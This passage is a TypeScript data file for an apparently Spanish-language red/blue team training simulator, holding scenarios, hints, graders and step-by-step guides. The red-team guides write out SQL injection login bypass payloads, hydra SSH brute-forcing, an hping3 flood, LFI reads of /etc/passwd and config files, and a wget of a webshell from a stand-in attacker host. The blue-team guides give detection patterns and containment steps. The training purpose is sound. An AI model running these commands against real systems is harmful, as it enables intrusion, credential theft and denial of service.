            hint: 'FORMATO OFICIAL ESIT REQUERIDO:\n\n=== SECCIÓN 1: INFORMACIÓN DEL INCIDENTE ===\n- Fecha y Hora de Detección\n- Tipo de Incidente (SQL Injection + Webshell)\n- Nivel de Severidad (Crítico/Alto/Medio/Bajo)\n- Sistema Afectado (APP-SERVER-01)\n- IP del Atacante\n\n=== SECCIÓN 2: DESCRIPCIÓN DETALLADA ===\n- ¿Cómo se detectó el incidente?\n- Timeline completa del ataque (con timestamps)\n- Vectores de ataque identificados\n- Vulnerabilidades explotadas (CVE-2021-WEBAPP)\n\n=== SECCIÓN 3: ANÁLISIS DE IMPACTO ===\n- Sistemas comprometidos\n- Datos accedidos/exfiltrados\n- Nivel de acceso obtenido por el atacante\n- Impacto en la confidencialidad, integridad y disponibilidad\n\n=== SECCIÓN 4: ACCIONES DE CONTENCIÓN ===\n- IP bloqueada en firewall\n- Servicios detenidos\n- Persistencia eliminada (webshell)\n\n=== SECCIÓN 5: EVIDENCIAS RECOLECTADAS ===\n- Logs preservados (access.log, error.log)\n- Hashes de archivos comprometidos\n- Capturas de comandos maliciosos\n- Análisis de tráfico de red\n\n=== SECCIÓN 6: ANÁLISIS FORENSE ===\n- Punto de entrada inicial\n- Técnicas MITRE ATT&CK identificadas\n- Indicadores de Compromiso (IOCs)\n\n=== SECCIÓN 7: REMEDIACIÓN ===\n- Parches aplicados\n- Configuraciones modificadas\n- Validación de efectividad\n\n=== SECCIÓN 8: RECOMENDACIONES ===\n- Mejoras a corto plazo\n- Mejoras a mediano plazo\n- Mejoras a largo plazo\n- Controles preventivos adicionales\n\n=== SECCIÓN 9: LECCIONES APRENDIDAS ===\n- ¿Qué funcionó bien?\n- ¿Qué se puede mejorar?\n- Cambios en procedimientos\n\n=== SECCIÓN 10: CIERRE ===\n- Estado del incidente (Resuelto/En progreso)\n- Responsables\n- Firma y aprobación'
        }
    ],
    
    hints: [
        {
            trigger: (env) => env.timeline.filter(log => log.message.includes('nmap')).length > 0,
            message: '🚨 [EQUIPO AZUL] Actividad de escaneo detectada. Inicia monitoreo intensivo de logs y prepara tu timeline de eventos.'
        },
        {
            trigger: (env) => {
                return env.timeline.some(log => 
                    log.message.includes("login.php") && 
                    (log.message.includes("OR") || log.message.includes("'"))
                );
            },
            message: '🔴 [EQUIPO AZUL] ¡ALERTA CRÍTICA! SQL Injection en progreso. CONTENER INMEDIATAMENTE y comenzar recolección de evidencias.'
        },
        {
            trigger: (env) => env.attackProgress.persistence.includes('webshell_deployed'),
            message: '💀 [EQUIPO AZUL] Webshell detectado. El atacante tiene persistencia. Ejecuta: sudo find /var/www/html -name "*.php" -exec sha256sum {} \; para verificar archivos.'
        },
        {
            trigger: (env) => {
                const redComplete = ['red-reconnaissance', 'red-webapp-exploit', 'red-access-admin', 'red-webshell-upload'].every(id => 
                    env.timeline.some(log => log.source_team === 'red')
                );
                const noReport = !env.timeline.some(log => 
                    log.source_team === 'red' && log.message.includes("report")
                );
                return redComplete && noReport;
            },
            message: '📝 [EQUIPO ROJO] Has completado el ataque. AHORA DOCUMENTA TODO en tu reporte. Sin documentación profesional, tu trabajo no tiene valor.'
        },
        {
            trigger: (env) => {
                const blueComplete = ['blue-detection-scan', 'blue-detection-sqli', 'blue-containment-block', 'blue-forensics-evidence'].every(id => 
                    env.timeline.some(log => log.source_team === 'blue')
                );
                const noReport = !env.timeline.some(log => 
                    log.source_team === 'blue' && log.message.includes("incident_report")
                );
                return blueComplete && noReport;
            },
            message: '📋 [EQUIPO AZUL] Has contenido el incidente. AHORA DOCUMENTA TODO siguiendo el formato ESIT oficial. La documentación es tan crítica como la respuesta técnica.'
        },
        {
            trigger: (env) => {
                const logs = env.timeline.filter(log => log.source_team === 'blue');
                return logs.length > 5 && !env.defenseProgress.blockedIPs.includes('192.168.1.100');
            },
            message: '⚠️ [EQUIPO AZUL] Estás investigando pero NO has bloqueado al atacante. PRIORIDAD 1: Contener la amenaza. PRIORIDAD 2: Investigar.'
        }
    ],
    
    evaluation: (env) => {
        const redObjectives = ['red-reconnaissance', 'red-webapp-exploit', 'red-access-admin', 'red-webshell-upload', 'red-data-exfiltration', 'red-report-creation'];
        const blueObjectives = ['blue-detection-scan', 'blue-detection-sqli', 'blue-containment-block', 'blue-containment-services', 'blue-forensics-evidence', 'blue-forensics-logs', 'blue-remediation', 'blue-report-creation'];
        
        const redPoints = redObjectives.reduce((sum, id) => {
            const obj = incidentReportScenario.objectives.find(o => o.id === id);
            return sum + (obj?.validator(env) ? obj.points : 0);
        }, 0);
        
        const bluePoints = blueObjectives.reduce((sum, id) => {
            const obj = incidentReportScenario.objectives.find(o => o.id === id);
            return sum + (obj?.validator(env) ? obj.points : 0);
        }, 0);
        
        const feedback: string[] = [];
        const hasRedReport = env.timeline.some(log => log.source_team === 'red' && log.message.includes("report"));
        const hasBlueReport = env.timeline.some(log => log.source_team === 'blue' && log.message.includes("incident_report"));
        const isContained = env.defenseProgress.blockedIPs.includes('192.168.1.100');
        const isPatched = env.defenseProgress.patchedVulnerabilities.includes('CVE-2021-WEBAPP');
        
        // Evaluar Equipo Rojo
        if (redPoints >= 100 && hasRedReport) {
            feedback.push('⚔️ **EQUIPO ROJO: EXCELENTE** - Ataque completo y documentado profesionalmente.');
        } else if (redPoints >= 80) {
            feedback.push('⚔️ **EQUIPO ROJO: BUENO** - Ataque exitoso pero documentación incompleta.');
        } else if (redPoints >= 60) {
            feedback.push('⚔️ **EQUIPO ROJO: REGULAR** - Ataque parcial o sin documentación adecuada.');
        } else {
            feedback.push('⚔️ **EQUIPO ROJO: INSUFICIENTE** - No se completaron las fases críticas del ataque.');
        }
        
        // Evaluar Equipo Azul
        if (bluePoints >= 120 && hasBlueReport && isContained && isPatched) {
            feedback.push('🛡️ **EQUIPO AZUL: EXCELENTE** - Respuesta completa con documentación profesional.');
        } else if (bluePoints >= 100 && isContained) {
            feedback.push('🛡️ **EQUIPO AZUL: BUENO** - Incidente contenido pero documentación incompleta.');
        } else if (bluePoints >= 80) {
            feedback.push('🛡️ **EQUIPO AZUL: REGULAR** - Respuesta parcial o documentación inadecuada.');
        } else {
            feedback.push('🛡️ **EQUIPO AZUL: INSUFICIENTE** - Fallas críticas en contención o documentación.');
        }
        
        feedback.push(`\n**Puntuación Final:**\nEquipo Rojo: ${redPoints}/130 puntos\nEquipo Azul: ${bluePoints}/150 puntos`);
        
        if (!hasRedReport) {
            feedback.push('\n❌ **EQUIPO ROJO**: Reporte técnico NO presentado. Sin documentación, tu trabajo no es válido en un entorno profesional.');
        }
        
        if (!hasBlueReport) {
            feedback.push('\n❌ **EQUIPO AZUL**: Reporte de incidente NO completado según formato ESIT. La documentación es OBLIGATORIA en respuesta a incidentes.');
        }
        
        if (hasBlueReport && hasRedReport) {
            feedback.push('\n✅ **AMBOS EQUIPOS**: Documentación completa presentada. Este es el estándar profesional esperado.');
        }
        
        return {
            completed: (redPoints >= 100 && hasRedReport) || (bluePoints >= 120 && hasBlueReport),
            score: Math.max(redPoints, bluePoints),
            feedback
        };
    }
};

export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
    {
        id: 'escenario7',
        isInteractive: true,
        icon: 'shield-alert',
        color: 'bg-red-500',
        title: 'Escenario 7: Fortaleza Digital',
        subtitle: 'Defensa y Ataque Básico',
        description: 'Un servidor web crítico (10.0.10.5) tiene configuraciones por defecto inseguras. El Equipo Rojo debe explotarlas y el Equipo Azul asegurarlas.',
        difficulty: 'beginner',
        team: 'both',
        initialEnvironment: INITIAL_ENV_SCENARIO_7,
        objectives: [
            { id: 'red-1', description: 'Realizar reconocimiento de puertos (nmap)', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5') },
            { id: 'red-2', description: 'Obtener acceso SSH (hydra/ssh)', points: 40, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5') },
            { id: 'blue-1', description: 'Endurecer SSH (PermitRootLogin no)', points: 30, required: true, validator: (env) => {
                const host = env.networks.dmz?.hosts[0];
                const sshConfig = host?.files.find(f => f.path === '/etc/ssh/sshd_config');
                return !!(sshConfig && sshConfig.content.includes('PermitRootLogin no'));
            }},
            { id: 'blue-2', description: 'Activar Firewall (ufw)', points: 20, required: true, validator: (env) => env.networks.dmz.firewall.enabled }
        ],
        hints: [
            { trigger: (env) => !env.attackProgress.reconnaissance.includes('10.0.10.5'), message: "Rojo: Usa 'nmap 10.0.10.5' para descubrir puertos abiertos." },
            { trigger: (env) => !env.networks.dmz.firewall.enabled, message: "Azul: El firewall está desactivado. Usa 'sudo ufw enable' y revisa el estado." }
        ],
        evaluation: () => ({ completed: false, score: 0, feedback: [] })
    },
    {
        id: 'escenario8',
        isInteractive: true,
        icon: 'activity',
        color: 'bg-orange-500',
        title: 'Escenario 8: Furia en la Red',
        subtitle: 'Respuesta a Incidentes: DoS',
        description: 'El portal corporativo (10.0.20.10) está bajo un ataque masivo de Denegación de Servicio. El CPU está saturado y los usuarios reportan caída del servicio. Identifica la fuente y mitiga el ataque configurando el firewall.',
        difficulty: 'intermediate',
        team: 'both',
        initialEnvironment: INITIAL_ENV_SCENARIO_8,
        objectives: [
            { id: 'blue-1', description: 'Identificar la IP atacante (top / ss)', points: 20, required: true, validator: (env) => true }, // Implicit via detection
            { id: 'blue-2', description: 'Bloquear IP atacante (ufw deny from ...)', points: 40, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('192.168.1.100') },
            { id: 'blue-3', description: 'Restaurar servicio (CPU < 50%)', points: 40, required: true, validator: (env) => (env.networks.dmz.hosts[0].systemState?.cpuLoad || 0) < 50 },
            { id: 'red-1', description: 'Ejecutar ataque DoS (hping3)', points: 50, required: true, validator: (env) => (env.networks.dmz.hosts[0].systemState?.cpuLoad || 0) > 90 },
            { id: 'red-2', description: 'Instalar backdoor (echo ... >> index.php)', points: 50, required: true, validator: (env) => env.attackProgress.persistence.includes('backdoor') }
        ],
        hints: [
            { trigger: (env) => (env.networks.dmz.hosts[0].systemState?.cpuLoad || 0) > 80, message: "Azul: El sistema está lento. Ejecuta 'top' para ver el consumo de CPU." },
            { trigger: (env) => env.defenseProgress.blockedIPs.length === 0, message: "Azul: Usa 'ss -ant' o 'netstat' para ver muchas conexiones de una misma IP. Bloquéala con 'sudo ufw deny from [IP]'." }
        ],
        evaluation: () => ({ completed: false, score: 0, feedback: [] })
    },
    {
        id: 'escenario9',
        isInteractive: true,
        icon: 'layers',
        color: 'bg-purple-600',
        title: 'Escenario 9: La Cadena de Infección',
        subtitle: 'Kill Chain: LFI & Pivoting',
        description: 'Ataque multi-fase: Explotar LFI en WEB-DMZ-01, obtener credenciales y pivotar a la red interna para comprometer la base de datos.',
        difficulty: 'advanced',
        team: 'both',
        initialEnvironment: INITIAL_ENV_SCENARIO_9,
        objectives: [
            { id: 'red-1', description: 'Descubrir LFI (view.php)', points: 15, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('WEB-DMZ-01') },
            { id: 'red-2', description: 'Leer credenciales DB (config.php)', points: 25, required: true, validator: (env) => !!env.attackProgress.credentials['root@10.10.0.50'] },
            { id: 'red-3', description: 'Pivotar a DB-FINANCE-01', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.50') },
            { id: 'blue-1', description: 'Detectar LFI (logs)', points: 15, required: true, validator: (env) => env.defenseProgress.patchedVulnerabilities.includes('LFI') },
            { id: 'blue-2', description: 'Bloquear pivoteo (Firewall)', points: 30, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.destPort === 3306) }
        ],
        hints: [
            { trigger: (env) => !env.attackProgress.reconnaissance.includes('WEB-DMZ-01'), message: "Rojo: Escanea WEB-DMZ-01. Busca archivos PHP sospechosos." },
            { trigger: (env) => env.attackProgress.reconnaissance.includes('WEB-DMZ-01') && !env.attackProgress.credentials['root@10.10.0.50'], message: "Rojo: Prueba LFI en view.php. Busca archivos de configuración." }
        ],
        evaluation: () => ({ completed: false, score: 0, feedback: [] })
    },
    incidentReportScenario
];

export const RED_TEAM_HELP_TEXT = `
<h3 class="text-red-400 font-bold mb-2">Guía Rápida - Equipo Rojo</h3>
<ul class="list-disc pl-5 space-y-1 text-sm">
    <li>Tu objetivo es auditar y encontrar vulnerabilidades.</li>
    <li>Usa <code>nmap</code> para reconocimiento.</li>
    <li>Usa <code>hydra</code> para probar credenciales débiles.</li>
    <li>Documenta tus hallazgos.</li>
</ul>
`;

export const BLUE_TEAM_HELP_TEXT = `
<h3 class="text-blue-400 font-bold mb-2">Guía Rápida - Equipo Azul</h3>
<ul class="list-disc pl-5 space-y-1 text-sm">
    <li>Tu objetivo es monitorear y asegurar sistemas.</li>
    <li>Usa <code>journalctl</code> para ver logs de ataques.</li>
    <li>Usa <code>ufw</code> para bloquear tráfico malicioso.</li>
    <li>Edita configuraciones inseguras con <code>nano</code>.</li>
</ul>
`;

export const GENERAL_HELP_TEXT = `
<div class="mt-4 pt-4 border-t border-slate-700">
    <p class="text-xs text-slate-500">Use el comando <code>help [escenario]</code> para ayuda específica.</p>
</div>
`;

export const SCENARIO_HELP_TEXTS: { [key: string]: { red: string; blue: string; general: string } } = {
    'escenario7': { 
        red: "<p class='mt-2 text-red-300'>Objetivo: Acceder al servidor 10.0.10.5. Prueba si el usuario 'root' tiene una contraseña débil o si el servicio SSH permite login de root.</p>", 
        blue: "<p class='mt-2 text-blue-300'>Objetivo: Asegurar el servidor 10.0.10.5. Revisa /etc/ssh/sshd_config y asegúrate de que el firewall esté activo.</p>",
        general: "<p class='text-yellow-200'>Escenario 7: Un servidor mal configurado es un riesgo crítico.</p>"
    },
    'escenario8': {
        red: "<p class='mt-2 text-red-300'>Objetivo: Saturar el servidor 10.0.20.10. Usa 'hping3' para ejecutar un ataque DoS. Intenta colocar persistencia mientras el equipo azul está distraído.</p>",
        blue: "<p class='mt-2 text-blue-300'>Objetivo: Restaurar el servicio. Identifica la IP que está causando el tráfico masivo con 'ss' o 'netstat' y bloquéala con 'ufw'.</p>",
        general: "<p class='text-yellow-200'>Escenario 8: Denegación de Servicio (DoS) y respuesta a incidentes.</p>"
    },
    'escenario9': {
        red: "<p class='mt-2 text-red-300'>Objetivo: Kill Chain Completa. 1) Escanea WEB-DMZ-01. 2) Encuentra LFI en view.php. 3) Lee config.php para obtener credenciales. 4) Pivota a la red interna 10.10.0.50 usando SSH o MySQL.</p>",
        blue: "<p class='mt-2 text-blue-300'>Objetivo: Detectar y Bloquear. 1) Revisa logs por patrones LFI (../etc/passwd). 2) Bloquear IP atacante. 3) Parchear view.php. 4) Implementar reglas de firewall para prevenir tráfico de DMZ a Interna.</p>",
        general: "<p class='text-yellow-200'>Escenario 9: Movimiento Lateral y Defensa en Profundidad.</p>"
    },
    'escenario11': {
        general: `<pre class="whitespace-pre-wrap font-mono text-xs">\n<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 11: El Primer Reporte</strong>\nSimulación de incidente real con documentación profesional obligatoria.\nAmbos equipos DEBEN elaborar reportes completos para aprobar.\n</pre>`,
        blue: `<pre class="whitespace-pre-wrap font-mono text-xs">\n<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - RESPUESTA A INCIDENTES</strong>\nEste escenario simula tu PRIMER incidente real. La documentación es TAN importante como la respuesta técnica.\n\n<strong>FASE 1: DETECCIÓN TEMPRANA</strong>\n1. Monitorea logs continuamente:\n   <strong class="text-amber-300">tail -f /var/log/apache2/access.log</strong>\n   <strong class="text-amber-300">tail -f /var/log/apache2/error.log</strong>\n\n2. Busca patrones de ataque:\n   <strong class="text-amber-300">grep -i 'nmap\|scan\|nikto' /var/log/apache2/access.log</strong>\n   <strong class="text-amber-300">grep -i "OR\|UNION\|SELECT\|'\"" /var/log/apache2/access.log</strong>\n\n<strong>FASE 2: CONTENCIÓN INMEDIATA</strong>\n1. Identifica IP del atacante en logs\n2. Bloquea la IP:\n   <strong class="text-amber-300">sudo ufw deny from [IP_ATACANTE]</strong>\n\n3. Detén servicios comprometidos:\n   <strong class="text-amber-300">sudo systemctl stop apache2</strong>\n   <strong class="text-amber-300">sudo systemctl stop mysql</strong>\n\n<strong>FASE 3: RECOLECCIÓN DE EVIDENCIAS (CRÍTICO)</strong>\n1. Preserva logs ANTES de que se sobrescriban:\n   <strong class="text-amber-300">sudo cp /var/log/apache2/access.log ~/incident_access.log</strong>\n   <strong class="text-amber-300">sudo cp /var/log/apache2/error.log ~/incident_error.log</strong>\n\n2. Genera hashes de archivos web:\n   <strong class="text-amber-300">sha256sum /var/www/html/*.php > ~/evidence_hashes.txt</strong>\n\n3. Busca archivos sospechosos:\n   <strong class="text-amber-300">find /var/www/html -name '*.php' -mtime -1</strong>\n   <strong class="text-amber-300">ls -la /var/www/html/ | grep shell</strong>\n\n<strong>FASE 4: ANÁLISIS FORENSE</strong>\n1. Revisa intentos de SQL Injection:\n   <strong class="text-amber-300">grep -i "login.php" ~/incident_access.log | grep -i "OR\|'"</strong>\n\n2. Identifica comandos ejecutados por el atacante\n3. Documenta la timeline completa\n\n<strong>FASE 5: REMEDIACIÓN</strong>\n1. Parchea la vulnerabilidad:\n   <strong class="text-amber-300">sudo nano /var/www/html/login.php</strong>\n   (Reemplaza queries directas con prepared statements)\n\n2. Elimina webshells si existen:\n   <strong class="text-amber-300">sudo rm /var/www/html/shell.php</strong>\n\n3. Reinicia servicios seguros:\n   <strong class="text-amber-300">sudo systemctl start apache2</strong>\n\n<strong>FASE 6: DOCUMENTACIÓN (OBLIGATORIA)</strong>\nElabora tu reporte siguiendo el formato ESIT:\n<strong class="text-amber-300">nano /home/blue-team/incident_report.txt</strong>\n\n<strong class="text-red-500">TU REPORTE DEBE INCLUIR:</strong>\n✓ Información del incidente (fecha, hora, severidad)\n✓ Timeline completa con timestamps\n✓ Vectores de ataque identificados\n✓ CVEs explotadas\n✓ Impacto en C-I-D (Confidencialidad, Integridad, Disponibilidad)\n✓ Acciones de contención ejecutadas\n✓ Evidencias recolectadas (con hashes)\n✓ Análisis forense detallado\n✓ Remediación aplicada\n✓ Recomendaciones (corto, mediano y largo plazo)\n✓ Lecciones aprendidas\n\n<strong class="text-yellow-300">RECORDATORIO:</strong> En un entorno profesional, un incidente SIN documentación\nadecuada es considerado NO RESUELTO, sin importar qué tan bien\nhayas contenido técnicamente la amenaza.\n</pre>`,
        red: `<pre class="whitespace-pre-wrap font-mono text-xs">\n<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - PENTESTING CON DOCUMENTACIÓN</strong>\nSimulas un atacante real, pero con un objetivo adicional: DOCUMENTAR TODO.\nEn pentesting profesional, tu reporte vale más que el exploit.\n\n<strong>FASE 1: RECONOCIMIENTO</strong>\n1. Enumera el objetivo:\n   <strong class="text-amber-300">nmap -sV -sC -p- APP-SERVER-01</strong>\n   <strong class="text-amber-300">nmap --script=http-enum APP-SERVER-01</strong>\n\n2. Identifica tecnologías:\n   <strong class="text-amber-300">curl -I http://APP-SERVER-01</strong>\n   <strong class="text-amber-300">nikto -h http://APP-SERVER-01</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Todos los puertos abiertos, servicios, versiones\n\n<strong>FASE 2: ANÁLISIS DE VULNERABILIDADES</strong>\n1. Prueba el formulario de login:\n   <strong class="text-amber-300">curl http://APP-SERVER-01/login.php</strong>\n\n2. Busca inyecciones SQL:\n   <strong class="text-amber-300">dirb http://APP-SERVER-01 /usr/share/wordlists/dirb/common.txt</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Vulnerabilidades encontradas, CVEs aplicables\n\n<strong>FASE 3: EXPLOTACIÓN (SQL INJECTION)</strong>\n1. Ejecuta SQL Injection básico:\n   <strong class="text-amber-300">curl -X POST http://APP-SERVER-01/login.php -d \"user=admin' OR '1'='1&pass=anything\"</strong>\n\n2. Si funciona, prueba bypass de autenticación:\n   <strong class="text-amber-300">curl -X POST http://APP-SERVER-01/login.php -d \"user=admin'--&pass=x\"</strong>\n\n3. Accede al panel de administración:\n   <strong class="text-amber-300">curl http://APP-SERVER-01/admin.php</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Payload exacto, respuesta del servidor, nivel de acceso obtenido\n\n<strong>FASE 4: POST-EXPLOTACIÓN</strong>\n1. Intenta obtener shell (simulado):\n   <strong class="text-amber-300">wget http://attacker.com/shell.php -O /var/www/html/shell.php</strong>\n\n2. Simula exfiltración de datos:\n   <strong class="text-amber-300">curl http://APP-SERVER-01/admin.php?action=dump_db</strong>\n\n<strong class="text-red-500">DOCUMENTA:</strong> Persistencia establecida, datos accedidos\n\n<strong>FASE 5: ENUMERACIÓN DE DATOS (Opcional)</strong>\n1. Si tienes webshell, enumera sistema:\n   <strong class="text-amber-300">whoami</strong>\n   <strong class="text-amber-300">uname -a</strong>\n   <strong class=\"text-amber-300\">cat /etc/passwd</strong>\n\n<strong>FASE 6: ELABORACIÓN DE REPORTE (OBLIGATORIO)</strong>\nCrea tu reporte técnico de pentesting:\n<strong class="text-amber-300">nano /home/blue-team/red_team_report.txt</strong>\n\n<strong class="text-yellow-300">TU REPORTE TÉCNICO DEBE INCLUIR:</strong>\n\n<strong>1. RESUMEN EJECUTIVO</strong>\n   - Sistema objetivo\n   - Nivel de riesgo (Crítico/Alto/Medio/Bajo)\n   - Resumen del ataque en 3-4 líneas\n\n<strong>2. ALCANCE DEL PENTESTING</strong>\n   - IPs/Hosts probados\n   - Servicios evaluados\n   - Restricciones (si las hay)\n\n<strong>3. METODOLOGÍA</strong>\n   - Fases ejecutadas (Reconocimiento → Explotación → Post-explotación)\n   - Herramientas utilizadas\n\n<strong>4. HALLAZGOS DETALLADOS</strong>\n   Para cada vulnerabilidad encontrada:\n   ✓ Nombre y descripción\n   ✓ CVE (si aplica): CVE-2021-WEBAPP\n   ✓ Severidad (CVSS Score si es posible)\n   ✓ Pasos para reproducir (comandos exactos)\n   ✓ Evidencia (output de comandos)\n   ✓ Impacto potencial\n\n<strong>5. EXPLOTACIÓN EXITOSA</strong>\n   - Timeline del ataque (con timestamps)\n   - Comandos ejecutados paso a paso\n   - Nivel de acceso obtenido\n   - Datos comprometidos\n\n<strong>6. RECOMENDACIONES DE REMEDIACIÓN</strong>\n   Para cada vulnerabilidad:\n   ✓ Cómo parchear (código corregido si es posible)\n   ✓ Prioridad de remediación (Crítico/Alto/Medio/Bajo)\n   ✓ Esfuerzo estimado\n\n<strong>7. CONCLUSIONES</strong>\n   - Postura general de seguridad\n   - Riesgos críticos que requieren atención inmediata\n\n<strong class="text-red-500">FORMATO PROFESIONAL:</strong>\n- Usa markdown para estructura clara\n- Incluye código en bloques de código\n- Sé técnico pero comprensible\n- Cada hallazgo debe poder ser reproducido por el Equipo Azul\n\n<strong class="text-yellow-300">RECORDATORIO CRÍTICO:</strong>\nEn pentesting real, un exploit SIN documentación detallada es INÚTIL.\nTu cliente (el Equipo Azul) necesita entender EXACTAMENTE qué hiciste\ny cómo remediarlo. Tu reporte es tu producto final.\n</pre>`
    }
};

export const SCENARIO_7_GUIDE = `
GUÍA EXPERTA - ESCENARIO 7: FORTALEZA DIGITAL

FASE 1: RECONOCIMIENTO (AMBOS EQUIPOS)
- Rojo: Ejecutar 'nmap 10.0.10.5' para ver puertos. Esperar ver 22 (SSH) y 80 (HTTP).
- Azul: Ejecutar 'ss -tulnp' en el servidor para ver qué servicios escuchan.

FASE 2: ATAQUE (ROJO)
- Intentar login SSH manual: 'ssh root@10.0.10.5'.
- Si falla, usar fuerza bruta: 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.10.5'.
- Contraseña probable: 'toor' o 'P@ssw0rd'.

FASE 3: DEFENSA (AZUL)
- Detectar ataque: 'journalctl -u sshd | grep "Failed password"'.
- Endurecer SSH:
  1. 'sudo nano /etc/ssh/sshd_config'
  2. Cambiar 'PermitRootLogin yes' a 'PermitRootLogin no'.
  3. Guardar (Ctrl+O, Enter, Ctrl+X).
  4. Reiniciar servicio: 'sudo systemctl restart sshd'.
- Activar Firewall:
  1. 'sudo ufw allow 22/tcp' (¡Importante para no bloquearse!)
  2. 'sudo ufw enable'
`;

export const SCENARIO_8_GUIDE = `
GUÍA EXPERTA - ESCENARIO 8: FURIA EN LA RED

SITUACIÓN: Servidor 10.0.20.10 bajo ataque DoS masivo y fuerza bruta.

FASE 1: ANÁLISIS DE INCIDENTE (AZUL)
- Ejecutar 'top': Verificar carga de CPU (>90% es crítico).
- Ejecutar 'ss -ant': Verificar conexiones establecidas. Buscar IPs repetidas.
- Ejecutar 'tail -f /var/log/auth.log': Identificar intentos de login fallidos.

FASE 2: MITIGACIÓN (AZUL)
- Identificar IP maliciosa (simulada: 192.168.1.100).
- Bloquear IP: 'sudo ufw deny from 192.168.1.100'.
- Verificar caída de carga: Ejecutar 'top' nuevamente.

FASE 3: ATAQUE (ROJO)
- Ejecutar DoS: 'hping3 --flood -S 10.0.20.10'.
- Aprovechar la distracción para instalar persistencia:
  'echo "backdoor" >> /var/www/html/index.php'
`;

export const SCENARIO_9_GUIDE = `
GUÍA EXPERTA - ESCENARIO 9: LA CADENA DE INFECCIÓN (KILL CHAIN)

SITUACIÓN: Ataque complejo multi-etapa. DMZ (10.0.0.10) vulnerable a LFI, permitiendo acceso a red Interna (10.10.0.50).

FASE 1: RECONOCIMIENTO Y LFI (ROJO)
- Escanear DMZ: 'nmap 10.0.0.10'
- Encontrar vulnerabilidad web: 'dirb http://10.0.0.10' -> view.php
- Explotar LFI: 'curl "http://10.0.0.10/view.php?file=/etc/passwd"'
- Leer configuración crítica: 'curl "http://10.0.0.10/view.php?file=config.php"' -> Obtener credenciales DB.

FASE 2: PIVOTEO Y EXTRACCIÓN (ROJO)
- Conectar a DMZ (si se obtuvo shell) o pivotar directamente.
- Conectar a DB Interna: 'mysql -h 10.10.0.50 -u root -p' (Usar pass encontrada).
- Extraer datos: 'SELECT * FROM credit_cards'

FASE 3: DEFENSA Y CONTENCIÓN (AZUL)
- Detectar LFI en logs: 'grep "../" /var/log/nginx/access.log'
- Parchear view.php: Editar para validar input.
- Bloquear pivoteo: 'sudo ufw deny out to 10.10.0.0/24' en la DMZ.
`;

export const COMMAND_LIBRARY: CommandLibraryData = {
  "commandLibrary": {
    "categories": [
      {
        "id": "network-recon",
        "name": "Reconocimiento de Red",
        "icon": "search",
        "color": "bg-purple-500",
        "description": "Herramientas para descubrimiento y mapeo de redes",
        "commands": [
          {
            "name": "nmap",
            "fullName": "Network Mapper",
            "description": "Escáner de puertos y servicios de red. La herramienta de reconocimiento más utilizada en pentesting.",
            "syntax": "nmap [opciones] [objetivo]",
            "category": "reconnaissance",
            "team": "red",
            "examples": [
              {
                "command": "nmap 10.0.10.5",
                "description": "Escaneo básico de puertos comunes"
              },
              {
                "command": "nmap -sV -sC 10.0.10.5",
                "description": "Detección de versiones y scripts por defecto"
              },
              {
                "command": "nmap -p- -T4 10.0.10.5",
                "description": "Escaneo de todos los puertos (1-65535) de forma rápida"
              },
              {
                "command": "nmap -sS 10.0.10.0/24",
                "description": "SYN Stealth scan de toda una subred"
              },
              {
                "command": "nmap -O 10.0.10.5",
                "description": "Detección de sistema operativo"
              }
            ],
            "commonFlags": [
              { "flag": "-sS", "description": "TCP SYN scan (escaneo sigiloso)" },
              { "flag": "-sT", "description": "TCP connect scan (completa el handshake)" },
              { "flag": "-sU", "description": "UDP scan" },
              { "flag": "-sV", "description": "Detección de versiones de servicios" },
              { "flag": "-sC", "description": "Ejecuta scripts de Nmap por defecto" },
              { "flag": "-A", "description": "Escaneo agresivo (OS, versión, scripts, traceroute)" },
              { "flag": "-p", "description": "Especifica puertos (ej: -p 80,443 o -p-)" },
              { "flag": "-T0-T5", "description": "Velocidad del escaneo (0=paranoid, 5=insane)" },
              { "flag": "--script", "description": "Ejecuta scripts NSE específicos" },
              { "flag": "-Pn", "description": "No hace ping (asume que el host está activo)" },
              { "flag": "-n", "description": "No resuelve DNS" },
              { "flag": "-v", "description": "Modo verbose (más información)" }
            ],
            "useCases": [
              "Descubrimiento de servicios vulnerables",
              "Mapeo de infraestructura de red",
              "Identificación de sistemas operativos",
              "Detección de firewalls y filtros"
            ],
            "warnings": [
              "⚠️ El escaneo de redes sin autorización es ilegal",
              "⚠️ Algunos escaneos pueden ser detectados por IDS/IPS",
              "⚠️ Los escaneos agresivos pueden causar problemas en sistemas antiguos"
            ],
            "defenseCounters": [
              "Configurar IDS/IPS para detectar escaneos de puertos",
              "Implementar rate limiting en el firewall",
              "Cerrar puertos innecesarios y aplicar principio de menor privilegio"
            ]
          },
          {
            "name": "ping",
            "fullName": "Packet Internet Groper",
            "description": "Verifica la conectividad de red enviando paquetes ICMP Echo Request.",
            "syntax": "ping [opciones] [destino]",
            "category": "reconnaissance",
            "team": "both",
            "examples": [
              {
                "command": "ping 10.0.10.5",
                "description": "Ping continuo hasta interrumpir con Ctrl+C"
              },
              {
                "command": "ping -c 4 10.0.10.5",
                "description": "Envía solo 4 paquetes ICMP"
              },
              {
                "command": "ping -i 2 10.0.10.5",
                "description": "Envía pings cada 2 segundos"
              },
              {
                "command": "ping -s 1000 10.0.10.5",
                "description": "Envía paquetes de 1000 bytes"
              }
            ],
            "commonFlags": [
              { "flag": "-c", "description": "Número de paquetes a enviar" },
              { "flag": "-i", "description": "Intervalo entre paquetes (segundos)" },
              { "flag": "-s", "description": "Tamaño del paquete en bytes" },
              { "flag": "-W", "description": "Tiempo de espera para respuesta" },
              { "flag": "-f", "description": "Flood ping (requiere privilegios root)" }
            ],
            "useCases": [
              "Verificar conectividad básica de red",
              "Medir latencia y pérdida de paquetes",
              "Diagnóstico de problemas de red",
              "Verificar si un host está activo"
            ]
          },
          {
            "name": "traceroute",
            "fullName": "Trace Route",
